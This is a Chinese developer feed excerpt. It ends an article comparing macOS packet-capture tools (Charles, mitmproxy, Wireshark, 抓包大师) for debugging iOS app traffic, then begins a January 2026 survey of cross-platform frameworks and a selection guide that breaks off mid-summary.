<p>只要其中一步没做对，表现通常就是“什么都抓不到”。
这不是 Charles 的问题，而是代理模式本身的复杂度决定的。</p>
<hr/>
<h2 data-id="heading-1"><strong>mitmproxy：更偏向开发者的命令行方案</strong></h2>
<p>如果你更习惯终端环境，mitmproxy 是 Mac 上非常值得一试的工具。</p>
<p>它的优势在于：</p>
<ul>
<li>可脚本化</li>
<li>请求和响应可以用 Python 直接处理</li>
<li>适合自动化调试或测试场景</li>
</ul>
<p>但现实是，mitmproxy 对新手并不友好。
证书、代理、脚本三件事，只要有一项不熟，体验就会明显下降。</p>
<p>我一般只在需要“批量处理请求逻辑”时才会选它，而不是日常抓包。</p>
<hr/>
<h2 data-id="heading-2"><strong>Wireshark：不是替代品，而是补充</strong></h2>
<p>严格来说，Wireshark 并不是抓“HTTP 接口”的工具。</p>
<p>在 Mac 上用 Wireshark，更像是在看：</p>
<ul>
<li>TCP / UDP 连接</li>
<li>DNS 请求</li>
<li>TLS 握手是否成功</li>
</ul>
<p>它非常适合回答一些代理工具回答不了的问题，比如：</p>
<blockquote>
<p>请求有没有真正发出去？
是 DNS 失败，还是 TCP 被拒绝？</p>
</blockquote>
<p>但如果你想直接看 HTTPS 内容，Wireshark 并不合适，除非你已经能解密 TLS。</p>
<hr/>
<h2 data-id="heading-3"><strong>当抓包对象变成 iOS 设备，工具选择会明显收缩</strong></h2>
<p>一旦需求变成：</p>
<ul>
<li>Mac + iPhone</li>
<li>抓 App 内请求</li>
<li>HTTPS 是默认</li>
</ul>
<p>很多 Mac 抓包软件就开始显得力不从心。</p>
<p>代理模式可以继续用，但配置成本会迅速上升，尤其是面对证书校验、双向验证时。</p>
<hr/>
<h2 data-id="heading-4"><strong>抓包大师在 Mac 上的定位，其实很清晰</strong></h2>
<p>我第一次在 Mac 上用 <strong>抓包大师</strong>，并不是为了替代 Charles，而是因为代理模式已经走不通。</p>
<p>在 Mac 环境下，抓包大师更像是一个底层抓包工具，尤其是在抓 iOS 设备时。</p>
<p>它在 Mac 上常用的几种功能包括：</p>
<ul>
<li>HTTPS 代理抓包（传统方式）</li>
<li>HTTPS 暴力抓包（无需证书信任）</li>
<li>数据流抓包（查看所有网络数据）</li>
</ul>
<p>这些功能解决的是不同层级的问题，而不是互相替代。</p>
<hr/>
<h2 data-id="heading-5"><strong>如何在 Mac 上用抓包大师抓 iOS App</strong></h2>
<p>如果目标是 iPhone App：</p>
<ul>
<li>用 USB 连接 iPhone 到 Mac</li>
<li>保持设备解锁并信任电脑</li>
<li>按提示安装描述文件</li>
<li>选择 iOS 设备而不是“本机”</li>
<li>根据需求进入 HTTPS 代理抓包或 HTTPS 暴力抓包</li>
</ul>
<p>如果只是接口调试，我会先试代理模式；
如果代理抓不到，再切换暴力抓包。</p>
<p>这种按成本递增的方式，比一上来就搞复杂方案要省时间。</p>
<hr/>
<h2 data-id="heading-6"><strong>本机抓包与设备抓包，是两条完全不同的路</strong></h2>
<p>在 Mac 上抓包，经常会混淆两个概念：</p>
<ul>
<li>抓 Mac 本机流量</li>
<li>抓 iOS 设备流量</li>
</ul>
<p>前者更适合用 Charles、mitmproxy；
后者才是抓包大师发挥优势的地方。</p>
<p>抓包大师在 Mac 上第一次运行本机抓包时，会要求输入系统密码，这是 macOS 权限模型决定的，属于正常行为。</p>
<hr/>
<h2 data-id="heading-7"><strong>工具多，并不意味着要全用</strong></h2>
<p>实际工作中，我很少只用一个抓包工具：</p>
<ul>
<li>Charles：快速看接口</li>
<li>Wireshark：排查连接问题</li>
<li>抓包大师：处理 iOS、证书校验、复杂 HTTPS</li>
</ul>
<p>它们之间不是竞争关系，而是覆盖不同问题空间。</p>
<hr/>
<p>Mac 抓包软件确实不少，但真正好用的，往往取决于场景而不是功能列表。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[跨平台开发地图：2025跨平台技术简单总结 | 2026年1月]]></title>    <link>https://juejin.cn/post/7597642574933508105</link>    <guid>https://juejin.cn/post/7597642574933508105</guid>    <pubDate>2026-01-21T09:36:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597642574933508105" data-draft-id="7597623392456065075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="跨平台开发地图：2025跨平台技术简单总结 | 2026年1月"/> <meta itemprop="keywords" content="Flutter,客户端"/> <meta itemprop="datePublished" content="2026-01-21T09:36:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员老刘"/> <meta itemprop="url" content="https://juejin.cn/user/662360127965769"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            跨平台开发地图：2025跨平台技术简单总结 | 2026年1月
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/662360127965769/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员老刘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:36:04.000Z" title="Wed Jan 21 2026 09:36:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>哈喽，我是老刘</strong></p>
<p>2025年已成过往。随着iOS、Android、桌面端、Web与各类小程序的持续发展，原生开发的高墙已难以维系，成本与效率的矛盾达到顶峰。</p>
<p>跨平台不再只是备选项，而是个人和团队的必选项。但面对Flutter的全平台一致体验、React Native的新架构性能突破、uni-app x的原生编译能力、KMP的Compose全栈统一，究竟谁才是2026年的最优解？</p>
<p>如何在这个AI重塑代码的时代，把有限的资源发挥出最大的效率？</p>
<p>老刘每个月为大家画出最新的跨平台技术选型地图，帮你快速做决策。</p>
<p>本月，各大框架在“原生体验”与“AI提效”上都有重磅更新。</p>
<hr/>
<h2 data-id="heading-0">1. 2025年跨平台技术简单总结</h2>
<ul>
<li><strong>性能仍是核心</strong></li>
</ul>
<p>2025年，各个框架都在寻找性能的突破点。</p>
<p>Flutter全面普及Impeller引擎，解决了最后一公里的卡顿问题。</p>
<p>uni-app x和KMP则选择了另外一条路，通过编译为原生代码（Native Compilation），直接从物理层面消除了性能鸿沟。</p>
<p>RN则全面切换到新架构来实现性能的突破。</p>
<p>性能上向原生看齐是2025年跨平台技术的一个重要趋势。</p>
<ul>
<li><strong>平台拼图补全</strong></li>
</ul>
<p>框架们不再满足于能跑，而是追求各个平台的完美适配。</p>
<p>Flutter在桌面端和Web端（Wasm）持续发力，真正实现六端同源。</p>
<p>KMP推出了Kotlin-to-Swift导出功能，让iOS开发者也能优雅地接入，填补了跨平台在iOS原生生态上的最后一块拼图。</p>
<ul>
<li><strong>AI与框架深度融合</strong></li>
</ul>
<p>AI不再只是外部辅助，而是开始进入框架内部。</p>
<p>Flutter推出的Dart MCP Server让AI能直接理解项目结构和组件树。</p>
<p>MAUI也在不断完善其AI功能，如Copilot Agent，试图通过AI赋能来改善开发者体验。</p>
<p>应该说我们离描述即应用的时代不远了。</p>
<h2 data-id="heading-1">2. 最新技术动态</h2>
<h3 data-id="heading-2">2.1 React Native 新架构全面启用</h3>
<p>React Native 0.83 发布日志: <a href="https://link.juejin.cn?target=https%3A%2F%2Freactnative.dev%2Fblog" target="_blank" title="https://reactnative.dev/blog" ref="nofollow noopener noreferrer">reactnative.dev/blog</a></p>
<p>React Native 0.83 版本随 Expo SDK 55 正式到来。新架构（New Architecture）已成为默认标准，遗留架构代码正在被加速移除。新版本集成了 React 19.2，并在构建时间和应用体积上取得了显著优化。开发者现在可以享受到更接近原生的性能体验，以及更强大的 DevTools 支持。</p>
<h3 data-id="heading-3">2.2 Kotlin Multiplatform 生态成熟加速</h3>
<p>Kotlin 2.3.20-Beta1 新特性: <a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fdocs%2Fwhatsnew-eap.html" target="_blank" title="https://kotlinlang.org/docs/whatsnew-eap.html" ref="nofollow noopener noreferrer">kotlinlang.org/docs/whatsn…</a></p>
<p>Kotlin 2.3.20-Beta1 于本月发布，标志着 KMP 生态的进一步成熟。</p>
<p>Compose Multiplatform for iOS 已经稳定，越来越多的团队开始从原生转向 KMP。</p>
<p>K2 编译器的全面普及以及 JetBrains 在 AI 辅助开发（如 Koog 和 Mellum）上的投入，使得 KMP 的开发效率达到了新高度。</p>
<h3 data-id="heading-4">2.3 .NET MAUI 企业级发展</h3>
<p>.NET MAUI Roadmap: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdotnet%2Fmaui%2Fwiki%2FRoadmap" target="_blank" title="https://github.com/dotnet/maui/wiki/Roadmap" ref="nofollow noopener noreferrer">github.com/dotnet/maui…</a></p>
<p>.NET 11的规划和早期迭代正在进行中。当前重点依然是提升产品质量和性能稳定性。微软正在深度集成 GitHub Copilot 和 Copilot Agent，试图通过 AI 赋能来改善 MAUI 的开发者体验。尽管社区仍有关于稳定性的讨论，但其在企业级市场的地位依然稳固。</p>
<h3 data-id="heading-5">2.4 Flutter 平台更新</h3>
<p>Flutter 最新动态: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.flutter.dev%2Frelease%2Fwhats-new" target="_blank" title="https://docs.flutter.dev/release/whats-new" ref="nofollow noopener noreferrer">docs.flutter.dev/release/wha…</a></p>
<p>虽然社区对 Flutter 4.0 充满期待，但截止 2026 年 1 月，<strong>Flutter 3.38</strong> 仍是官方维护的最新稳定版本。目前的更新重点在于 <strong>Impeller 渲染引擎</strong> 的进一步优化与稳定性提升，该引擎现已在 iOS 和 Android 上默认启用，彻底解决了 shader 编译造成的卡顿问题。此外，Flutter 团队修复了 Android 端 Activity 销毁时的内存泄漏问题，并对 Android 15 的 16KB Page Size 提供了完整支持，继续巩固其在跨平台渲染一致性上的优势。</p>
<h3 data-id="heading-6">2.5 uni-app x 进展</h3>
<p>uni-app x 更新日志: <a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Frelease.html" target="_blank" title="https://uniapp.dcloud.net.cn/release.html" ref="nofollow noopener noreferrer">uniapp.dcloud.net.cn/release.htm…</a></p>
<p>近期 uni-app x 迎来了一系列重要更新（v4.87）。核心亮点包括：</p>
<ul>
<li><strong>多线程能力增强</strong>
新增 <code>uni.createWorker</code> API，正式支持 Worker 线程，显著提升复杂计算场景下的性能表现。</li>
<li><strong>鸿蒙生态深度适配</strong>
将逻辑层 JSVM 迁移至独立子线程，彻底解决主线程阻塞问题；新增微信登录、分享及屏幕亮度调节等原生能力。</li>
<li><strong>新设备与系统兼容</strong>
修复 Android 16KB 页大小模式下的录音问题，并提前适配 iPhone 17 系列机型。</li>
</ul>
<h3 data-id="heading-7">2.6 Valdi 进展</h3>
<p>Valdi GitHub 仓库: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSnapchat%2FValdi" target="_blank" title="https://github.com/Snapchat/Valdi" ref="nofollow noopener noreferrer">github.com/Snapchat/Va…</a></p>
<p>本月Valdi框架没有新的进展，最新发布版本仍然是beta-0.0.1</p>
<p>接下来老刘按照跨平台技术框架的三种路线，分别介绍一下目前主流的跨平台技术。</p>
<hr/>
<h2 data-id="heading-8">3. 自渲染类框架</h2>
<p>简单来说，就是框架自己携带渲染引擎，自己画界面，不用系统提供的组件。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ac5366533ca4bd6bd67eb742355ca8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769592963&amp;x-signature=p9QlSX5grX9AQZCf7ibxEegqJAY%3D" alt=" " loading="lazy"/></p>
<p>这样做有什么好处？</p>
<ul>
<li><strong>界面完全一致</strong>
UI渲染不依赖系统组件，多端展示效果完全统一。</li>
<li><strong>性能媲美原生</strong>
跳过系统UI层直接操作GPU绘制，架构与原生一致。</li>
<li><strong>无兼容性Bug</strong>
不调用系统原生组件，规避了因系统差异导致的兼容性问题。</li>
</ul>
<h3 data-id="heading-9">3.1 Flutter</h3>
<p>2024年Stack Overflow调查显示，Flutter是最受欢迎的跨平台框架。</p>
<p>全球有超过500万开发者在使用。</p>
<p>连阿里巴巴、腾讯、字节跳动都在使用Flutter。</p>
<p><strong>为什么这么多大厂选择Flutter？</strong></p>
<ul>
<li>
<p><strong>性能强劲</strong>
切换Impeller引擎后，Flutter性能已与原生应用一致。</p>
</li>
<li>
<p><strong>开发高效</strong>
热重载实现秒级预览，Dart语言在功能性与复杂度间达成完美平衡。</p>
</li>
<li>
<p><strong>生态成熟</strong>
pub.dev拥有超4万插件，涵盖地图、支付等各类功能，开箱即用。</p>
</li>
<li>
<p><strong>测试友好</strong>
拥有客户端领域最佳的单元测试支持，是TDD及敏捷团队的最优选择。</p>
</li>
<li>
<p><strong>拥抱AI</strong></p>
<ul>
<li><strong>AI Toolkit</strong>
集成Gemini API，快速实现聊天、识别等功能。</li>
<li><strong>本地部署</strong>
支持TensorFlow Lite/ONNX，保障隐私安全。</li>
<li><strong>Dart MCP Server</strong>
让AI助手直接理解项目，辅助编码与调试。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-10">4. 中间层类框架</h2>
<p>简单来说，就是在你的代码和系统原生组件之间，加了一个"翻译官"。</p>
<p>比如你用JavaScript写界面逻辑，框架帮你翻译成原生的Button、TextView。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e196cfdc1934937ba904c0b45952ca9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769592963&amp;x-signature=LZWF5bzu1qmsxLa1%2BcVllCSF56U%3D" alt=" " loading="lazy"/></p>
<p><strong>核心特点：</strong></p>
<ul>
<li><strong>成熟的开发体验</strong>
复用React/Vue/C#等生态成熟的开发思路，上手快，学习成本低。</li>
<li><strong>原生组件渲染</strong>
最终映射为系统原生组件，UI符合平台规范，质感原生。</li>
<li><strong>桥接性能损耗</strong>
通过中间层与原生通信存在"翻译"开销，交互密集场景性能稍弱，常规界面无感知。</li>
</ul>
<h3 data-id="heading-11">4.1 React Native</h3>
<p>React Native是第二受欢迎的跨平台框架，是Facebook开源的项目。</p>
<p><strong>为什么这么多人选择React Native？</strong></p>
<p><strong>核心优势：</strong></p>
<ul>
<li><strong>零门槛上手</strong>
React开发者可直接复用JSX、组件化及状态管理经验，一周即可转型。</li>
<li><strong>生态庞大</strong>
npm拥有超15万相关包，共享Web生态，导航、支付等库应有尽有。</li>
<li><strong>动态热更新</strong>
支持不发布新版本App直接在线更新，无需发版即可修复Bug或上线新功能，迭代极快。</li>
<li><strong>架构升级</strong>
Meta持续投入，新架构引入Fabric和TurboModules，性能提升30%，旧架构已退役。</li>
</ul>
<h3 data-id="heading-12">4.2 .NET MAUI</h3>
<p>2024年5月，微软正式停止了Xamarin的支持，.NET MAUI（Multi-platform App UI）成为微软官方的跨平台解决方案。</p>
<p><strong>核心优势：</strong></p>
<ul>
<li><strong>企业级保障</strong>
微软提供长期技术支持（LTS），确保企业应用所需的稳定性。</li>
<li><strong>数据处理强</strong>
C#擅长处理复杂业务逻辑，特别适合金融、ERP等数据密集型应用。</li>
<li><strong>生态深度集成</strong>
与Azure、SQL Server等微软全家桶无缝对接，集成体验最佳。</li>
</ul>
<hr/>
<h2 data-id="heading-13">5. 转译类框架</h2>
<p>简单来说，就是把你写的高级语言代码，"翻译"成目标平台的原生代码。</p>
<p>比如你用Kotlin写业务逻辑，框架帮你"翻译"成iOS的Swift代码。</p>
<p>或者你用类TypeScript的语法写界面，框架帮你"翻译"成Android的Kotlin和iOS的Swift。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3be51e4c05b4708b7a4a24e1702d7dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769592963&amp;x-signature=lLFw6%2FAXGcvzr9xcSXTJ6XRbhe4%3D" alt="" loading="lazy"/></p>
<p><strong>核心特点：</strong></p>
<ul>
<li><strong>性能接近原生</strong></li>
</ul>
<p>因为最终运行的就是原生代码，没有任何中间层损耗。</p>
<p>就像你直接用Swift写iOS应用，用Kotlin写Android应用一样。</p>
<ul>
<li><strong>能享受原生生态</strong></li>
</ul>
<p>转译后的代码可以直接调用平台的所有API。</p>
<ul>
<li><strong>转译效果可能不完美</strong></li>
</ul>
<p>毕竟是机器"翻译"的代码，有时候可能不如手写的原生代码优雅。</p>
<p>特别是复杂的业务逻辑，转译后的代码可能需要人工优化。</p>
<p>但这个问题随着AI技术的发展，正在快速改善。</p>
<h3 data-id="heading-14">5.1 Kotlin Multiplatform (KMP)</h3>
<p>KMP的核心用法：业务逻辑用KMP共享，UI用Compose Multiplatform统一开发</p>
<p>这是KMP的最新发展方向，结合了Compose Multiplatform的强大能力。</p>
<p>一套Compose代码可以运行在Android、iOS、Desktop、Web等所有平台。</p>
<p><strong>KMP的特点</strong></p>
<ul>
<li><strong>真正的一套代码多平台</strong></li>
</ul>
<p>不仅业务逻辑共享，UI也可以共享，开发效率大幅提升。</p>
<ul>
<li><strong>保持原生性能</strong></li>
</ul>
<p>Compose Multiplatform在各平台都编译为原生代码，性能接近原生应用。</p>
<ul>
<li><strong>技术栈统一</strong></li>
</ul>
<p>全部使用Kotlin生态，学习成本更低，团队协作更高效。</p>
<ul>
<li><strong>渐进式迁移</strong></li>
</ul>
<p>你不需要重写整个应用，可以先从一个模块开始。</p>
<p>比如先把网络层用KMP重写，然后逐步迁移UI到Compose Multiplatform。</p>
<ul>
<li><strong>生态仍需完善</strong></li>
</ul>
<p>生态仍在加速建设，注意版本兼容与插件成熟度，第三方库相对较少，但发展很快。</p>
<h3 data-id="heading-15">5.2 uni-app / uni-app x</h3>
<p><strong>传统uni-app</strong>
基于Vue.js + JavaScript，更适用于小程序开发</p>
<p><strong>uni-app x</strong>
全新架构，使用UTS语言，性能达到原生级别</p>
<p><strong>uni-app x的技术特点</strong></p>
<ul>
<li><strong>平台支持最全</strong></li>
</ul>
<p>一套代码可以发布到：iOS、Android、Web、各种小程序、快应用、鸿蒙...</p>
<p>总共支持14+个平台，这是其他框架做不到的。</p>
<ul>
<li><strong>小程序优先的设计理念</strong></li>
</ul>
<p>如果你的产品需要同时支持App和小程序，uni-app几乎是唯一的选择。</p>
<p>其他框架都是App优先。</p>
<ul>
<li><strong>国产化支持</strong></li>
</ul>
<p>对鸿蒙、信创等国产化平台支持最好。</p>
<p>这对国内企业来说非常重要。</p>
<ul>
<li>
<p><strong>uni-app的局限</strong></p>
<p><strong>生态相对封闭</strong>
主要依赖DCloud的生态
<strong>国际化程度低</strong>
海外开发者使用较少
<strong>技术栈绑定</strong>
主要适合Vue技术栈</p>
</li>
</ul>
<h3 data-id="heading-16">5.3 Valdi</h3>
<p>Valdi的核心思路属于转译方案的范畴，但是并发代码级转译。</p>
<p>它采用了介于转译和中间层之间的混合架构，将UI组件树编译为原生组件并交由C++引擎管理生命周期，同时保留业务逻辑在TS层（Worker）运行，从而实现无JS Bridge的高性能渲染。</p>
<p>这样的好处是在一定程度上避免了转译类方案代码翻译不到位造成的一些问题。</p>
<p>但是仍然会有中间层方案在高UI交互场景下的性能问题，这部分就需要把处理逻辑放到C++/Swift/Kotlin编写的Polyglot模块解决。</p>
<p>站在纯粹客户端跨平台开发的角度，转译类方案老刘目前更推荐KMP。</p>
<p>Valdi可以作为一个有潜力的备选，等生态更加成熟后再重新考虑。</p>
<hr/>
<h2 data-id="heading-17">6. 技术选型指南</h2>
<p>看了这么多技术栈，是不是更晕了？老刘把复杂的选型逻辑浓缩成一份<strong>实战决策指南</strong>，帮你快速拍板。</p>
<h3 data-id="heading-18">6.1 核心推荐：Flutter (通用首选)</h3>
<p>对于 90% 的新启动 App 项目，<strong>Flutter 是当前版本的最优解</strong>。</p>
<ul>
<li><strong>性能强悍</strong>
自带 Impeller 渲染引擎，不依赖系统组件，体验无限接近原生。无论是复杂的动画还是高性能列表，都能轻松驾驭。</li>
<li><strong>效率极高</strong>
Hot Reload (热重载) 让改代码像刷新网页一样快。一套代码覆盖 Android、iOS、Web 甚至桌面端，研发成本降低 40% 以上。</li>
<li><strong>AI 友好</strong>
作为 Google 亲儿子，Cursor、Claude 等 AI 工具对 Dart/Flutter 的支持极为成熟，能自动生成高质量 UI 代码。</li>
</ul>
<p><strong>⚠️ 避坑提示</strong>
如果你的应用极度依赖原生比如有大量历史遗留的原生代码，或对包体积有苛刻要求 (&lt;10MB)，需谨慎评估。</p>
<h3 data-id="heading-19">6.2 潜力观察：Kotlin Multiplatform (KMP)</h3>
<p>极度依赖原生的最佳选择。</p>
<ul>
<li>
<p><strong>核心定位</strong>
<strong>逻辑共享，UI 原生</strong>。
它不强求 UI 统一，而是让 Android 和 iOS 共享数据层、网络层和业务逻辑代码。</p>
</li>
<li>
<p><strong>适用场景</strong></p>
<ul>
<li>已经在原生层面积累了大量的UI组件和功能模块，可以逐步把业务逻辑切换到KMP。</li>
<li>应用强依赖系统底层能力 (蓝牙、NFC、深度硬件交互)，同时又希望保持跨平台的优势。</li>
</ul>
</li>
<li>
<p><strong>现状判断</strong>
技术理念先进，但第三方生态仍在爬坡期。<strong>2026 谨慎全量 All-in。</strong></p>
</li>
</ul>
<h3 data-id="heading-20">6.3 谨慎评估需求：App + 小程序 ≠ 一套代码</h3>
<p>一个产品有App和小程序不代表他们的业务逻辑是完全一致的，小程序在产品定位上不应该是App的简化版。</p>
<ul>
<li><strong>最佳实践：App和小程序承担不同的产品职责</strong>
<ul>
<li><strong>App (Flutter/原生)</strong>
负责沉浸式体验、复杂交互、高粘性留存 (如阅读、创作、社交)。</li>
<li><strong>小程序 (原生/Uni-app)</strong>
负责营销裂变、即用即走、低成本获客 (如分享落地页、简单工具)。</li>
</ul>
</li>
<li><strong>决策依据</strong>
只有当功能重叠度 &gt; 80% 且交互极其简单 (如纯展示类新闻、简单电商) 时，才推荐使用 Uni-app/Taro 等方案同时生成 App 和小程序。</li>
</ul>
<h3 data-id="heading-21">6.4 决策速查表</h3>








































<table><thead><tr><th align="left">你的项目场景</th><th align="left">推荐技术栈</th><th align="left">理由</th></tr></thead><tbody><tr><td align="left"><strong>从 0 到 1 新项目</strong></td><td align="left"><strong>Flutter</strong></td><td align="left">效率与体验的最佳平衡点</td></tr><tr><td align="left"><strong>原生项目转型跨平台</strong></td><td align="left"><strong>Flutter</strong></td><td align="left">可以增量迁移，混合开发风险低</td></tr><tr><td align="left"><strong>重度依赖原生底层</strong></td><td align="left"><strong>KMP</strong></td><td align="left">风险低，渐进式重构</td></tr><tr><td align="left"><strong>App与小程序功能重叠</strong></td><td align="left"><strong>Uni-app</strong></td><td align="left">小程序支持好</td></tr><tr><td align="left"><strong>系统级工具</strong></td><td align="left"><strong>纯原生 (Swift/Kotlin)</strong></td><td align="left">无中间层损耗，完全掌控硬件</td></tr><tr><td align="left"><strong>团队 Web 背景</strong></td><td align="left"><strong>React Native</strong></td><td align="left">学习曲线平滑，社区资源丰富</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-22">7. 总结与建议</h2>
<p>写了这么多，老刘最后给你一个终极建议。</p>
<p><strong>2026年跨平台开发，记住这三个关键词：务实、聚焦、长期主义。</strong></p>
<h3 data-id="heading-23">7.1 务实</h3>
<p>软件开发没有银弹。</p>
<p>Flutter性能好但包体积大，React Native动态性好但有桥接损耗，KMP接近原生但生态不成熟。</p>
